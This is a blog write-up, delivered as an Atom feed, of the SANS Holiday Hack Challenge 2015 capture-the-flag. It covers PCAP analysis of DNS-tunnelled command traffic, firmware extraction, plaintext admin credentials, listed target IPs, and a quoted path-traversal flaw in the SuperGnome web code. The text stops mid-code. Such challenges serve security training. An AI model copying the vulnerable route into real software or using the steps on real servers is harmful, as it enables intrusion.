<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>All Your Base Are Belong To Me</title><link href="https://allyourbase.utouch.fr/" rel="alternate"></link><link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" rel="self"></link><id>https://allyourbase.utouch.fr/</id><updated>2016-01-09T00:00:00+01:00</updated><entry><title>SANS Christmas Challenge 2015</title><link href="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/" rel="alternate"></link><updated>2016-01-09T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2016-01-09:posts/2016/01/09/sans-christmas-challenge-2015/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2015_logo.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_christmas_challenge_2015_logo.png" /&gt;
&lt;p&gt;This year again, the SANS institute delights us with a wonderful
&lt;a class="reference external" href="https://holidayhackchallenge.com/"&gt;Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We follow the &lt;a class="reference external" href="https://quest.holidayhackchallenge.com/"&gt;Dosis family&lt;/a&gt;,
after they purchase a
&lt;a class="reference external" href="https://en.wikipedia.org/wiki/The_Elf_on_the_Shelf"&gt;Gnome in Your Home&lt;/a&gt;
for their kids, Jessica and Joshua. These two kids, especially bright
for their age, tinker with the gnome, to find that it has a weird,
and possible illegal behaviour.&lt;/p&gt;
&lt;p&gt;It all begins when Joshua gives us a capture file of the network
communications he recorded from the gnome...&lt;/p&gt;
&lt;div class="section" id="part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets"&gt;
&lt;h2&gt;Part 1: Dance of the Sugar Gnome Fairies: &lt;em&gt;Curious Wireless Packets&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;We're given a &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-capture.pcap"&gt;PCAP file&lt;/a&gt; (sha256:
&lt;code&gt;655541fb645af45db68a739066325e2f1138812a6893254ae7b48acd9519a330&lt;/code&gt;),
and are asked to analyze it, to see what we can find.  If we open it with
Wireshark, we can see a lot of DNS traffic, with what looks
like base64-encoded data in the TXT fields.&lt;/p&gt;
&lt;img alt="giyh-capture_wireshark.png" class="align-center" src="/images/sans-christmas-challenge-2015/giyh-capture_wireshark.png" /&gt;
&lt;p&gt;Using DNS requests as a communication channel with a Command and Control server
is a well known trick to bypass traffic filtering, because outbound DNS is
often authorized on a local network. So, let's extract and decode the TXT
fields. tshark is particularly adapted for this task:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tshark -r giyh-capture.pcap -Y dns -T fields -e dns.txt &lt;span class="p"&gt;|&lt;/span&gt; base64 -d &amp;gt; giyh-capture_decoded.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here, we ask tshark to focus on the DNS traffic, and to output only the TXT
fields. Now, let's take a look at the decoded file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat giyh-capture_decoded.txt
NONE:NONE:NONE:NONE:NONE:NONE:NONE:EXEC:iwconfig
EXEC:START_STATEEXEC:wlan0     IEEE 802.11abgn  ESSID:&lt;span class="s2"&gt;&amp;quot;DosisHome-Guest&amp;quot;&lt;/span&gt;
EXEC:          Mode:Managed  Frequency:2.412 GHz  Cell: 7A:B3:B6:5E:A4:3F
EXEC:          Tx-Power&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt; dBm
EXEC:          Retry short limit:7   RTS thr:off   Fragment thr:off
EXEC:          Encryption key:off
EXEC:          Power Management:off
EXEC:
EXEC:lo        no wireless extensions.
EXEC:
EXEC:eth0      no wireless extensions.
EXEC:STOP_STATENONE:NONE:NONE:EXEC:cat /tmp/iwlistscan.txt
EXEC:START_STATEEXEC:wlan0     Scan completed :
EXEC:          Cell &lt;span class="m"&gt;01&lt;/span&gt; - Address: 00:7F:28:35:9A:C7
EXEC:                    Channel:1
EXEC:                    Frequency:2.412 GHz &lt;span class="o"&gt;(&lt;/span&gt;Channel 1&lt;span class="o"&gt;)&lt;/span&gt;
EXEC:                    &lt;span class="nv"&gt;Quality&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;29/70  Signal &lt;span class="nv"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;-81 dBm
EXEC:                    Encryption key:on
EXEC:                    ESSID:&lt;span class="s2"&gt;&amp;quot;CHC&amp;quot;&lt;/span&gt;
EXEC:                    Bit Rates:1 Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; 5.5 Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;6&lt;/span&gt; Mb/s
EXEC:                              &lt;span class="m"&gt;9&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;18&lt;/span&gt; Mb/s
EXEC:                    Bit Rates:24 Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;36&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;48&lt;/span&gt; Mb/s&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="m"&gt;54&lt;/span&gt; Mb/s
EXEC:                    Mode:Master
EXEC:                    Extra:tsf&lt;span class="o"&gt;=&lt;/span&gt;000000412e67cddf
EXEC:                    Extra: Last beacon: 5408ms ago
EXEC:                    IE: Unknown: 00055837335A36
EXEC:                    IE: Unknown: 010882848B960C121824
EXEC:                    IE: Unknown: 030101
EXEC:                    IE: Unknown: 200100
EXEC:                    IE: IEEE 802.11i/WPA2 Version 1
EXEC:                        Group Cipher : CCMP
EXEC:                        Pairwise Ciphers &lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt; : CCMP
EXEC:                        Authentication Suites &lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt; : PSK
EXEC:                    IE: Unknown: 2A0100
EXEC:                    IE: Unknown: 32043048606C
EXEC:                    IE: Unknown: DD180050F2020101040003A4000027A4000042435E0062322F00
EXEC:                    IE: Unknown: 2D1A8C131BFFFF000000000000000000000000000000000000000000
EXEC:                    IE: Unknown: 3D1601080800000000000000000000000000000000000000
EXEC:                    IE: Unknown: DD0900037F01010000FF7F
EXEC:                    IE: Unknown: DD0A00037F04010000000000
EXEC:                    IE: Unknown: 0706555320010B1B
&lt;span class="o"&gt;[&lt;/span&gt;snip&lt;span class="o"&gt;]&lt;/span&gt;
EXEC:STOP_STATENONE:NONE:NONE:NONE:FILE:/root/Pictures/snapshot_CURRENT.jpg
FILE:START_STATE,NAME&lt;span class="o"&gt;=&lt;/span&gt;/root/Pictures/snapshot_CURRENT.jpgFILE:&lt;span class="se"&gt;\x&lt;/span&gt;FF&lt;span class="se"&gt;\x&lt;/span&gt;D8&lt;span class="se"&gt;\x&lt;/span&gt;FF&lt;span class="se"&gt;\x&lt;/span&gt;E0&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;10JFIF&lt;span class="o"&gt;[&lt;/span&gt;raw binary&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, lots of stuff! We can see that some shell commands are executed, and there
seems to be the upload of a JPEG file. The commands and results seem to be
&lt;code&gt;EXEC:&lt;/code&gt;, and the upload of the file and the content with
&lt;code&gt;FILE:&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can recover the executed commands, which are &lt;code&gt;iwconfig&lt;/code&gt;, to see the
configuration of the different wirelass network interfaces of the gnome, and
&lt;code&gt;cat /tmp/iwlistscan.txt&lt;/code&gt;, which seems to give the result of the
&lt;code&gt;iwlist scan&lt;/code&gt; command, which scans available wireless networks.&lt;/p&gt;
&lt;p&gt;We can recover the content of the uploaded file, with the following commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;binwalk giyh-capture_decoded.txt &lt;span class="c"&gt;# binwalk gives us the offset at which the JPEG file starts&lt;/span&gt;

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class="m"&gt;4495&lt;/span&gt;          0x118F          JPEG image data, JFIF standard  1.01
&lt;span class="nv"&gt;$ &lt;/span&gt;dd &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;skip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4495&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;giyh-capture_decoded.txt &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/FILE://g&amp;#39;&lt;/span&gt; &amp;gt; giyh-capture_image.jpg &lt;span class="c"&gt;# we skip the beginning of the decoded file, and remove the &amp;quot;FILE:&amp;quot; string from the result&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get the following image:&lt;/p&gt;
&lt;img alt="giyh-capture_image.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh-capture_image.jpg" /&gt;
&lt;p&gt;The flag for this part is &lt;code&gt;GnomeNET-NorthAmerica&lt;/code&gt;&lt;/p&gt;
&lt;img alt="first_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/first_flag_confirmation.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit"&gt;
&lt;h2&gt;Part 2: Iâ€™ll be Gnome for Christmas: &lt;em&gt;Firmware Analysis for Fun and Profit&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;After seeing such a strange and creepy behaviour (come on, man, you're taking
pictures of little kids' bedrooms), we are asked to analyze the firmware of
the gnome.&lt;/p&gt;
&lt;p&gt;We recover the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/giyh-firmware-dump.bin"&gt;firmware&lt;/a&gt; (sha256:
&lt;code&gt;bee93a79bb8ee2eba526494b4e6e56a601e1fa9589a1cccf7bfe61261ab8db20&lt;/code&gt;) from
Jessica. Now, time to analyze it! The best tool I know for file analysis is binwalk:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;binwalk giyh-firmware-dump.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class="m"&gt;0&lt;/span&gt;             0x0             PEM certificate
&lt;span class="m"&gt;1809&lt;/span&gt;          0x711           ELF 32-bit LSB shared object, ARM, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;168803&lt;/span&gt;        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: &lt;span class="m"&gt;17376149&lt;/span&gt; bytes,  &lt;span class="m"&gt;4866&lt;/span&gt; inodes, blocksize: &lt;span class="m"&gt;131072&lt;/span&gt; bytes, created: Tue Dec  &lt;span class="m"&gt;8&lt;/span&gt; 19:47:32 2015
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Using the &lt;code&gt;-e&lt;/code&gt; option form binwalk, we can extract the different files,
and unsquash the file system, to get a browsable version of the file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;binwalk -e giyh-firmware-dump.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class="m"&gt;0&lt;/span&gt;             0x0             PEM certificate
&lt;span class="m"&gt;1809&lt;/span&gt;          0x711           ELF 32-bit LSB shared object, ARM, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;168803&lt;/span&gt;        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: &lt;span class="m"&gt;17376149&lt;/span&gt; bytes,  &lt;span class="m"&gt;4866&lt;/span&gt; inodes, blocksize: &lt;span class="m"&gt;131072&lt;/span&gt; bytes, created: Tue Dec  &lt;span class="m"&gt;8&lt;/span&gt; 19:47:32 2015
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;_giyh-firmware-dump.bin.extracted/squashfs-root
&lt;span class="nv"&gt;$ &lt;/span&gt;ls
bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www
&lt;span class="nv"&gt;$ &lt;/span&gt;cat etc/banner
  _______                     ________        __
 &lt;span class="p"&gt;|&lt;/span&gt;       &lt;span class="p"&gt;|&lt;/span&gt;.-----.-----.-----.&lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;.----.&lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;_
 &lt;span class="p"&gt;|&lt;/span&gt;   -   &lt;span class="o"&gt;||&lt;/span&gt;  _  &lt;span class="p"&gt;|&lt;/span&gt;  -__&lt;span class="p"&gt;|&lt;/span&gt;     &lt;span class="o"&gt;||&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="o"&gt;||&lt;/span&gt;   _&lt;span class="o"&gt;||&lt;/span&gt;   _&lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;_______&lt;span class="o"&gt;||&lt;/span&gt;   __&lt;span class="p"&gt;|&lt;/span&gt;_____&lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="o"&gt;||&lt;/span&gt;________&lt;span class="o"&gt;||&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt;____&lt;span class="p"&gt;|&lt;/span&gt;
          &lt;span class="p"&gt;|&lt;/span&gt;__&lt;span class="p"&gt;|&lt;/span&gt; W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 DESIGNATED DRIVER &lt;span class="o"&gt;(&lt;/span&gt;Bleeding Edge, r47650&lt;span class="o"&gt;)&lt;/span&gt;
 -----------------------------------------------------
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Orange Juice         Combine all juices in a
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Pineapple Juice      tall glass filled with
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Grapefruit Juice     ice, stir well.
  * &lt;span class="m"&gt;2&lt;/span&gt; oz. Cranberry Juice
 -----------------------------------------------------
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the firmware is based on OpenWRT, more specifically the
Designated Driver branch, which is the development branch. We can find
the architecture by looking at some binary files in the &lt;code&gt;bin&lt;/code&gt; folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file bin/ash
bin/ash: ELF 32-bit LSB executable, ARM, EABI5 version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The architecture of the gnome seems to be 32-bit ARM.&lt;/p&gt;
&lt;p&gt;We can see a &lt;code&gt;www&lt;/code&gt; folder at the root of the file system. Let's take a
look at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls
app.js  bin  files  node_modules  package.json  public  routes  views
&lt;span class="nv"&gt;$ &lt;/span&gt;ls views
cameras.jade  error.jade  files.jade  gnomenet.jade  index.jade  layout.jade  login.jade  network.jade  settings.jade
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The embedded web site seems to be a NodeJS website, using the Jade Node
Template Engine.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;head app.js
var &lt;span class="nv"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;express&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;favicon&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;serve-favicon&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;logger&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;morgan&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;cookieParser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cookie-parser&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;bodyParser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;body-parser&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;routes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./routes/index&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;mongo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mongodb&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;monk&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;monk&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
var &lt;span class="nv"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; monk&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the web site uses MongoDB as the database management system. We
can find the MongoDB files in the squashfs-root/opt/mongodb directory. Let's
copy them to a local install of MongoDB so that we can analyze them:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb
&lt;span class="nv"&gt;$ &lt;/span&gt;sudo chown mongodb:nogroup /var/lib/mongodb/gnome.*
&lt;span class="nv"&gt;$ &lt;/span&gt;sudo service mongodb start
&lt;span class="nv"&gt;$ &lt;/span&gt;mongo gnome
MongoDB shell version: 2.4.10
connecting to: gnome
&amp;gt; show collections
cameras
settings
status
system.indexes
users
&amp;gt; db.users.find&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;56229f58809473d11033515b&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;user_level&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;56229f63809473d11033515c&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;SittingOnAShelf&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;user_level&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the credentials are stored in plaintext, which is a big no-no.
The credentials to connect to the gnome web interface as an administrator are
&lt;code&gt;admin/SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The flag for this part is &lt;code&gt;SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;img alt="second_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/second_flag_confirmation.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt"&gt;
&lt;h2&gt;Part 3: Let it Gnome! Let it Gnome! Let it Gnome! &lt;em&gt;Internet-Wide Scavenger Hunt&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;The gnomes are apparently commanded by five SuperGnomes, which are the C&amp;amp;C
servers. How can we identify them? Jessica tells us that we can &lt;em&gt;sho Dan&lt;/em&gt; the
password information we found. It took me a while (shame on me) to understand
that it was a clue given to us to use the famous Shodan website to identify
the SuperGnomes present on the Internet.&lt;/p&gt;
&lt;img alt="jessica_shodan" class="align-center" src="/images/sans-christmas-challenge-2015/jessica_shodan.png" /&gt;
&lt;p&gt;If we look back at the traffic capture from the first part of this write-up,
we can see that the gnome is communicating with a server named
cmd.sg1.atnascorp.com.&lt;/p&gt;
&lt;p&gt;Let's take the string &amp;quot;atnascorp&amp;quot; and search it in Shodan. You can find the
result at &lt;a class="reference external" href="https://www.shodan.io/search?query=atnascorp"&gt;this URL&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="shodan_result" class="align-center" src="/images/sans-christmas-challenge-2015/shodan_result.png" /&gt;
&lt;p&gt;From the traffic analysis and the results from Shodan, we have found the five
SuperGnomes:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)&lt;/li&gt;
&lt;li&gt;SuperGnome02: 52.34.3.80, located in United States, Portland (OR)&lt;/li&gt;
&lt;li&gt;SuperGnome03: 52.64.191.71, located in Australia, Sydney&lt;/li&gt;
&lt;li&gt;SuperGnome04: 52.192.152.132, located in Japan, Tokyo&lt;/li&gt;
&lt;li&gt;SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These targets were confirmed by the Great and Powerful Oracle, Tom Hessman.&lt;/p&gt;
&lt;img alt="third_flag_confirmation" class="align-center" src="/images/sans-christmas-challenge-2015/third_flag_confirmation.png" /&gt;
&lt;p&gt;No flag for this part.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="part-4-theres-no-place-like-gnome-for-the-holidays-gnomage-pwnage"&gt;
&lt;h2&gt;Part 4: Thereâ€™s No Place Like Gnome for the Holidays: &lt;em&gt;Gnomage Pwnage&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Now, it's time to compromise these SuperGnomes! To prove that we have control
of the SuperGnomes, we must recover the content of
&lt;code&gt;/gnome/www/files/gnome.conf&lt;/code&gt;.&lt;/p&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.2.229.189/"&gt;SuperGnome01&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;This SuperGnome is the easiest of them all. Indeed, you just have to connect
to the web interface with the credentials found during the firmware analysis.
You can then go to the files tab, and download the configuration file:&lt;/p&gt;
&lt;img alt="sg01_w00t" class="align-center" src="/images/sans-christmas-challenge-2015/sg01_w00t.png" /&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;NCC1701&lt;/code&gt;
(&lt;a class="reference external" href="https://en.wikipedia.org/wiki/USS_Enterprise_%28NCC-1701%29"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.34.3.80/"&gt;SuperGnome02&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;When we connect to SuperGnome02, we can go the files tab, but we can't download
any file.&lt;/p&gt;
&lt;img alt="sg02_download_fail.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg02_download_fail.png" /&gt;
&lt;p&gt;However, there is a path traversal vulnerability in the web backend
of the SuperGnome:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File www/route/index.js, line 182&lt;/span&gt;
&lt;span class="c1"&gt;// CAMERA VIEWER&lt;/span&gt;
&lt;span class="c1"&gt;// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cam&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;query&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;  &lt;span class="c1"&gt;// check for .png&lt;/span&gt;
  &lt;span class="c1"&gt;//if (camera.indexOf(&amp;#39;.png&amp;#39;) == -1) // STUART: Removing this...I think this is a better solution... right?&lt;/span&gt;
  &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// add .png if its not found&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cam:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
